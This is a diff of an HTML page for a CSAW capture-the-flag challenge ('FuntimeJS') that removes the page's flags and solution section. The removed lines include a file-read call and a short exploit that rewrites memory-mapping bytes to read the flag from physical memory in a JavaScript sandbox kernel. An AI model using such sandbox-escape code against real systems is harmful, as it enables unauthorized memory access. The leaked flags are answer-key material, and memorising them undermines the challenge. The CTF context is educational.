@@ -1842,9 +1842,7 @@
                 
             <li class="second-level"><a href="#description">Description</a></li>
                 
-            <li class="second-level"><a href="#flag">Flag</a></li>
-                
-            <li class="second-level"><a href="#solution">Solution</a></li>
+            <li class="second-level"><a href="#topics-covered">Topics Covered</a></li>
                 
     </ul>
 </div></div>
@@ -1862,18 +1860,7 @@ JavaScript is memory safe, right? So you can't read the flag at physical address
 Right?
 <a href="http://littlequery.chal.csaw.io">http://littlequery.chal.csaw.io</a>
 UPDATE 14:10 Eastern: I'm dumb. The unintentional solution is now in a separate challenge (FuntimeJS 2).</p>
-<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<p><code class="codehilite">flag{1_th0t_j@vascript_w@s_mem0ry_s@f3!}</code>
-<code class="codehilite">flag{I_f0rg0t_1n1trd_1nclud3d_a11_files}</code></p>
-<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
-<p>Part 1:
-<code class="codehilite">console.log(__SYSCALL.initrdReadFile(&#39;/flag.txt&#39;))</code>
-Part 2:</p>
-<div class="codehilite"><pre><span></span>let mem = __SYSCALL.getSystemResources().memoryRange
-let view = (where) =&gt; new Uint8Array(mem.block(where, 0x100).buffer())
-view(0x1a01000+0x41*8).set([0xeb,0x00,0xa0,0xad,0xde])
-console.log(String.fromCharCode.apply(null, view((0x41&lt;&lt;21) + 0x1eeeef)))
-</pre></div></div>
+<h2 id="topics-covered">Topics Covered<a class="headerlink" href="#topics-covered" title="Permanent link">&para;</a></h2></div>
             
         
     </div>
